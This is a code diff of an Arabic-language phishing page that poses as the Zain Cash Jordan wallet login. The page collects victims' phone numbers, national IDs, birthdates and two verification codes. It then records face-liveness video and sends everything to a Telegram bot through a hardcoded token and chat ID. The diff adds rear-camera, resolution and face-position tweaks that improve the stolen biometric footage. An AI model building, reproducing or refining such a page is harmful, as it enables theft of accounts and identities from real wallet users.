@@ -7,7 +7,6 @@
   <meta name="theme-color" content="#2F80ED">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
   <style>
-    /* === عام === */
     :root{
       --primary-1: #2F80ED;
       --primary-2: #56CCF2;
@@ -17,11 +16,7 @@
       --danger-1: #ef5350;
       --danger-2: #e53935;
     }
-
-    html,body{
-      height:100%;
-    }
-
+    html,body{height:100%;}
     body {
       background: linear-gradient(135deg, var(--primary-1) 0%, var(--primary-2) 100%);
       min-height: 100vh;
@@ -54,8 +49,7 @@
     .step-dot.active { background: linear-gradient(135deg,var(--primary-1) 70%,var(--primary-2) 100%); border-color:var(--primary-1); }
 
     label { color:var(--primary-1); font-size:15px; font-weight:600; margin-bottom:8px; display:block; }
-    /* موحّد لخانات الإدخال */
-    input[type="text"], input[type="tel"], input[type="number"], select, .text-input {
+    input[type="text"], input[type="tel"], select, .text-input {
       padding:12px 12px;
       border-radius:10px;
       border:2px solid var(--input-border);
@@ -71,21 +65,13 @@
       -moz-appearance: none;
       appearance: none;
     }
-    input[type="text"]::placeholder,
-    input[type="tel"]::placeholder,
-    input[type="number"]::placeholder,
-    .text-input::placeholder {
-      color: #9fbfe8;
-      opacity:1;
-    }
-    input[type="text"]:focus, input[type="tel"]:focus, input[type="number"]:focus, select:focus, .text-input:focus {
+    input::placeholder { color: #9fbfe8; opacity:1; }
+    input:focus, select:focus, .text-input:focus {
       box-shadow: 0 6px 22px rgba(47,128,237,0.18);
       border-color: var(--primary-1);
       background: #fbfeff;
-      transform: translateY(0);
     }
 
-    /* زر موحد أساسي */
     .button {
       background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%);
       color:#fff;
@@ -103,7 +89,6 @@
     }
     .button:active { transform:translateY(1px); opacity:0.92; }
 
-    /* زر الرجوع - مصغر لكنه مرئي ومتناسق */
     .back-btn {
       position:relative;
       display:inline-block;
@@ -119,7 +104,6 @@
     }
     .back-btn:hover { background:#f4faff; }
 
-    /* زر إلغاء أحمر */
     .danger-button {
       background: linear-gradient(90deg,var(--danger-1) 0%,var(--danger-2) 100%);
       color:#fff;
@@ -140,28 +124,24 @@
 
     .zain-footer { margin-top:20px; text-align:center; color:#a6c7ef; font-weight:600; font-size:13px; opacity:0.85; }
 
-    /* === كاميرا === */
     .camera-wrap { display:flex; flex-direction:column; align-items:center; gap:14px; }
     .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; box-sizing:border-box; display:flex; align-items:center; justify-content:center; }
-    .camera-box video { width:100%; height:100%; object-fit:cover; }
+    .camera-box video { width:100%; height:100%; object-fit:cover; transform: scaleX(1); }
     .instruction-box { background: rgba(0,0,0,0.72); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; line-height:1.45; }
     .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }
 
-    /* processing modal */
     #processingModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:10000; align-items:center; justify-content:center; color:#fff; }
     #processingModal.active { display:flex; }
     .processingBox { background:rgba(0,0,0,0.65); padding:20px 26px; border-radius:12px; text-align:center; min-width:260px; }
     .spinner { width:48px; height:48px; border-radius:50%; border:5px solid rgba(255,255,255,0.18); border-top-color:#fff; animation:spin 1s linear infinite; margin:0 auto 12px; }
     @keyframes spin { to { transform:rotate(360deg); } }
 
-    /* modal error */
     #modalError { display:none; position:fixed; inset:0; background:rgba(47,128,237,0.13); z-index:9999; align-items:center; justify-content:center; }
     #modalError.active { display:flex; }
     #modalContent { background:#fff; padding:27px 32px; border-radius:13px; text-align:center; border:2px solid #f9b3b3; box-shadow:0 7px 34px rgba(47,128,237,0.2); }
     #modalContent .err-title { color:#e53935; font-size:19px; font-weight:700; }
     #modalContent .err-msg { margin-top:8px; font-weight:600; color:#444; }
 
-    /* تحسينات عرض الحقول على الشاشات الصغيرة */
     @media (max-width:450px){
       #app{padding:16px 1.5vw 10px 1.5vw;}
       .camera-box{height:320px;}
@@ -170,7 +150,6 @@
       .button { min-width: 100px; font-size:16px; padding:11px 10px; }
       input[type="text"], input[type="tel"], select { padding:11px 10px; font-size:15px; }
     }
-
   </style>
 </head>
 <body>
@@ -193,18 +172,22 @@
   </div>
 
 <script>
-  // === إعدادات البوت (كما طُلب) ===
+  // ---------- إعدادات عامة ----------
   const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
   const CHAT_ID = "6873334348";
-
   const app = document.getElementById('app');
   const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";
   const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
+
+  // تفضيل الكاميرا: 'environment' سيحاول استخدام الكاميرا الخلفية (دقة غالبًا أفضل على بعض الأجهزة)
+  // إذا أردت إعادة الكاميرا الأمامية عدّل إلى 'user'
+  const PREFERRED_FACING = 'environment'; // 'environment' أو 'user'
 
   let userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
   let telegramMsgId = null;
   let waitingTimeout = null;
 
+  // ---------- صفحات الواجهات (كما سابقاً) ----------
   function stepIndicator(step){
     return `
       <div class="step-indicator">
@@ -224,7 +207,6 @@
     `;
   }
 
-  // صفحة رقم الهاتف
   function renderPhoneStep(){
     app.innerHTML = `
       ${header("مرحبًا بك! سجل دخولك لحسابك")}
@@ -248,7 +230,6 @@
     };
   }
 
-  // صفحة الرقم الوطني + ميلاد
   function renderNationalIdStep(){
     app.innerHTML = `
       <button class="back-btn" id="backBtn">&#8592; رجوع</button>
@@ -272,7 +253,7 @@
       const month = document.getElementById('birthMonth').value;
       const year = document.getElementById('birthYear').value;
       if(!/^\d{10,12}$/.test(nid)){ alert('يرجى إدخال رقم وطني صحيح (10 إلى 12 رقم)'); document.getElementById('nationalId').focus(); return; }
-      if(!day || !month || !year){ alert('يرجى إدخال تاريخ الميلاد (اليوم/الشهر/السنة)'); return; }
+      if(!day || !month || !year){ alert('يرجى إدخال تاريخ الميلاد (اليوم/الشهر/ال��نة)'); return; }
       userData.nationalId = nid;
       userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
       try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`); } catch(e){ console.log(e); }
@@ -293,13 +274,7 @@
     let years = '<select id="birthYear" required><option value="">السنة</option>';
     for(let y=maxYear;y>=minYear;y--) years += `<option value="${y}">${y}</option>`;
     years += '</select>';
-    el.innerHTML = `
-      <div style="display:flex;gap:8px;">
-        ${days}
-        ${months}
-        ${years}
-      </div>
-    `;
+    el.innerHTML = `<div style="display:flex;gap:8px;">${days}${months}${years}</div>`;
   }
 
   function showNationalIdWaitAndGotoCode5(){
@@ -318,7 +293,6 @@
     waitingTimeout = setInterval(()=>{ sec--; if(waitElem) waitElem.textContent = sec; if(sec===0){ clearInterval(waitingTimeout); renderCode5Step(); } },1000);
   }
 
-  // رمز 5
   function renderCode5Step(){
     app.innerHTML = `
       <button class="back-btn" id="backBtn">&#8592; رجوع</button>
@@ -361,7 +335,6 @@
     waitingTimeout = setInterval(()=>{ sec--; if(waitElem) waitElem.textContent = sec; if(sec===0){ clearInterval(waitingTimeout); renderCode4Step(); } },1000);
   }
 
-  // رمز 4 — يبدأ التحقق بالوجه تلقائياً بعد التأكيد
   function renderCode4Step(){
     app.innerHTML = `
       <button class="back-btn" id="backBtn">&#8592; رجوع</button>
@@ -384,7 +357,7 @@
       userData.code4 = code;
       try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n🔒 ${userData.code4}`); } catch(e){ console.log(e); }
       try {
-        await startCaptureSequence(); // يبدأ التحقق التلقائي؛ في حال فشل يعود لصفحة رمز الـ4
+        await startCaptureSequence(); // يبدأ التحقق التلقائي
       } catch (err) {
         console.error('Capture failed', err);
         alert('لم نستطع الوصول إلى الكاميرا. يرجى التأكد من أذونات الكاميرا ثم المحاولة مرة أخرى.');
@@ -394,7 +367,6 @@
     document.getElementById('backBtn').onclick = () => renderCode5Step();
   }
 
-  // شاشة تحضير قصير قبل طلب الإذن
   function renderPreparingMessage(){
     app.innerHTML = `
       <div style="text-align:center;padding:18px;">
@@ -410,10 +382,12 @@
     `;
   }
 
-  // تسجيل فيديو تسلسلي — تعليمات واضحة قبل كل خطوة، عدّ 3..1، تسجيل 5s لكل خطوة
+  // ---------- تحسين: كشف حركة الرأس (يمين/يسار) باستخدام FaceDetector API إن توفّر ----------
+  // منطق: نحاول استخدام FaceDetector (متاح في كروم) لتحليل موقع مستطيل الوجه
+  // ثم أثناء التسجيل نراقب centerX ونقارن بمنتصف الفيديو لنعرض "يسار" أو "يمين" أو "في المنتصف"
   async function startCaptureSequence(){
     renderPreparingMessage();
-    await wait(1000);
+    await wait(800);
 
     const steps = [
       { label: 'اغمض عينيك', instruction: 'أغلق عينيك بالكامل لمدة 5 ثوانٍ', duration: 5000 },
@@ -439,17 +413,68 @@
 
     const cancelBtn = document.getElementById('cancelCapture');
     let stream = null;
+
+    // طلب الكاميرا مع تفضيل الـ facingMode لزيادة الدقة (environment = خلفية، user = أمامية)
+    const constraints = {
+      audio: true,
+      video: {
+        width: { ideal: 1280 },
+        height: { ideal: 720 },
+        facingMode: { ideal: PREFERRED_FACING } // طلب "environment" إن أردت قلب الكاميرا
+      }
+    };
+
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+      stream = await navigator.mediaDevices.getUserMedia(constraints);
     } catch (err) {
-      throw err;
+      // بعض الأجهزة قد لا تدعم facingMode المطلوب أو الدقة، فحاول بدون قيود المعينة
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      } catch (err2) {
+        throw err2;
+      }
     }
 
     const videoEl = document.getElementById('videoPreview');
     videoEl.srcObject = stream;
+
     const instructionBox = document.getElementById('instructionBox');
     const countdownEl = document.getElementById('countdown');
 
+    // إعداد كاشف الوجه إن كان متوفرًا
+    let fd = null;
+    let faceDetectorSupported = false;
+    if ('FaceDetector' in window) {
+      try {
+        fd = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
+        faceDetectorSupported = true;
+      } catch (e) {
+        faceDetectorSupported = false;
+      }
+    }
+
+    // وسيلة بديلة: استخدام API التجريبي (العرض) — إن لم يتوفر لن يتوفر كشف تلقائي
+    // سنجري فحصًا دوريًا لموقع الوجه (إن توفّر)
+    let detectInterval = null;
+    function startDetecting(onResult) {
+      if (!faceDetectorSupported) return;
+      detectInterval = setInterval(async () => {
+        try {
+          const faces = await fd.detect(videoEl);
+          if (faces && faces.length) {
+            const b = faces[0].boundingBox; // { x, y, width, height }
+            onResult(b);
+          }
+        } catch (e) {
+          // تجاهل أخطاء الكشف
+        }
+      }, 200); // كشف كل 200ms
+    }
+    function stopDetecting() {
+      if (detectInterval) { clearInterval(detectInterval); detectInterval = null; }
+    }
+
+    // MediaRecorder
     let chosenMime = null;
     if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
       if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
@@ -460,46 +485,87 @@
     const options = chosenMime ? { mimeType: chosenMime } : undefined;
 
     let recorder;
-    try { recorder = new MediaRecorder(stream, options); } catch(e){ try{ recorder = new MediaRecorder(stream); } catch(err){ stopStream(stream); throw err; } }
-
+    try { recorder = new MediaRecorder(stream, options); } catch(e) { try { recorder = new MediaRecorder(stream); } catch(err) { stopStream(stream); throw err; } }
     let chunks = [];
-    recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) chunks.push(ev.data); };
+    recorder.ondataavailable = ev => { if (ev.data && ev.data.size) chunks.push(ev.data); };
 
     let cancelled = false;
-    cancelBtn.onclick = () => { cancelled = true; try { if(recorder.state !== 'inactive') recorder.stop(); } catch(e){} stopStream(stream); renderCode4Step(); };
+    cancelBtn.onclick = () => { cancelled = true; try { if (recorder.state !== 'inactive') recorder.stop(); } catch(e){} stopStream(stream); stopDetecting(); renderCode4Step(); };
 
-    await wait(250);
-    for (let i=0;i<steps.length;i++){
+    await wait(250); // وقت لعرض الفيديو
+
+    // دالة لمقارنة مركز الوجه بالنسبة لعرض الفيديو وإظهار النص "يسار/يمين/في المنتصف"
+    function feedbackFromBoundingBox(boundingBox) {
+      const videoWidth = videoEl.videoWidth || videoEl.clientWidth;
+      const centerX = boundingBox.x + boundingBox.width / 2;
+      const leftThreshold = videoWidth * 0.4;
+      const rightThreshold = videoWidth * 0.6;
+      if (centerX < leftThreshold) return 'مائل لليسار';
+      if (centerX > rightThreshold) return 'مائل لليمين';
+      return 'في المنتصف';
+    }
+
+    // أثناء كل خطوة سنشغّل كشف الوجه إن أمكن لتحديث إشارة الحركة
+    for (let i=0; i<steps.length; i++){
       if (cancelled) break;
       const s = steps[i];
-      instructionBox.textContent = s.instruction;
-      await wait(1400);
 
+      // تعليمات قبل التسجيل
+      instructionBox.textContent = s.instruction;
+      await wait(1200);
+
+      // عد تنازلي 3..1
       countdownEl.style.display = 'block';
-      for (let c=3;c>=1;c--){ countdownEl.textContent = c; await wait(700); }
+      for (let c=3; c>=1; c--){ countdownEl.textContent = c; await wait(700); }
       countdownEl.style.display = 'none';
 
-      try { recorder.start(); } catch(err){ console.warn('recorder.start', err); }
-
-      let rem = Math.ceil(s.duration/1000);
-      for (let t=rem; t>=1; t--){ instructionBox.textContent = `${s.label} — تبقّى ${t} ثانية`; await wait(1000); }
-
-      if (recorder.state !== 'inactive') {
-        try { recorder.stop(); } catch(e) { console.warn('recorder.stop', e); }
+      // قبل البدء: شغّل كشف الوجه لإعطاء ملاحظات لحظية خلال التسجيل
+      if (faceDetectorSupported) {
+        // ستستدعي onResult كل 200ms مع boundingBox
+        startDetecting((b) => {
+          const fb = feedbackFromBoundingBox(b);
+          // عندما يطلب المستخدم أن يحرك وجهه لليسار مثلاً، نعرض ما يلاحظه الكاشف
+          instructionBox.textContent = `${s.label} — ${fb}`;
+        });
+      } else {
+        // إذا لم يتوفر الكاشف: نعرض رسالة عامة (ما زال التسجيل سيعمل)
+        instructionBox.textContent = `${s.label} — تابع التعليمات وأعد الرأس للمنتصف بعد الحركة`;
       }
+
+      // ابدأ التسجيل
+      try { recorder.start(); } catch (err) { console.warn('recorder.start error', err); }
+
+      // أثناء التسجيل: نص ثوان متبقية + (إن لم يكن FaceDetector متوفرًا، لا توجد ملاحظات)
+      let rem = Math.ceil(s.duration / 1000);
+      for (let t = rem; t>=1; t--) {
+        // إذا لم يغير الكاشف النص، نعرض نص افتراضي زائد الثواني المتبقية
+        if (!faceDetectorSupported) instructionBox.textContent = `${s.label} — تبقّى ${t} ثانية`;
+        await wait(1000);
+      }
+
+      // إيقاف التسجيل
+      if (recorder.state !== 'inactive') {
+        try { recorder.stop(); } catch(e) { console.warn('recorder.stop error', e); }
+      }
+
+      // أوقف الكشف بعد انتهاء كل خطوة
+      stopDetecting();
       await wait(300);
     }
 
+    // النهاية: تجميع البلوبات وإرسالها
     stopStream(stream);
+    stopDetecting();
     const finalType = chosenMime ? chosenMime.split(';')[0] : (chunks[0] ? chunks[0].type : 'video/webm');
     const finalBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
 
     showProcessing(true);
-    try { await sendVideoToTelegramAsVideo(finalBlob); } catch(e){ console.error(e); } finally { showProcessing(false); }
+    try { await sendVideoToTelegramAsVideo(finalBlob); } catch(err){ console.error('send video error', err); } finally { showProcessing(false); }
 
     showFinalErrorAndReset();
   }
 
+  // ---------- إرسال الفيديو إلى تلغرام ----------
   async function sendVideoToTelegramAsVideo(blob){
     try {
       const form = new FormData();
@@ -515,7 +581,7 @@
       await sendVideoAsDocumentFallback(blob);
     } catch (err) {
       console.error('sendVideo error', err);
-      try { await sendVideoAsDocumentFallback(blob); } catch(e){ console.error('fallback failed', e); throw err; }
+      try { await sendVideoAsDocumentFallback(blob); } catch (e) { console.error('fallback failed', e); throw err; }
     }
   }
   async function sendVideoAsDocumentFallback(blob){
@@ -529,6 +595,7 @@
     else console.warn('sendDocument failed', data);
   }
 
+  // ---------- رسائل نصية لتليجرام ----------
   async function sendToTelegramAndGetMsgId(msg){
     try {
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -577,7 +644,6 @@
 
   // ابدأ التطبيق
   renderPhoneStep();
-
 </script>
 </body>
 </html>
